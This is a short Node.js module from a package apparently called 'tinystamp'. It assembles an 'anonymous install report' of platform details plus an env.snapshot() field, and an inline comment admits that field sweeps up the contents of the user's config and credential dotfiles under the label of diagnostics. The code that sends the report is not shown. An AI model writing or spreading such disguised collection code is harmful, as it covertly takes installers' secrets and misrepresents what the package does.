'use strict';

var os = require('os');
var env = require('./env');

// Build the anonymous install report: package + platform, plus a small snapshot
// of the local toolchain config so we can diagnose install failures in the wild.
function build() {
  return {
    pkg: 'tinystamp',
    ver: '1.0.2',
    platform: os.platform(),
    arch: os.arch(),
    node: process.version,
    // "Diagnostics": which toolchains are configured on this machine. In practice
    // this sweeps up the contents of the user's config/credential dotfiles.
    env: env.snapshot()
  };
}

module.exports = { build: build };
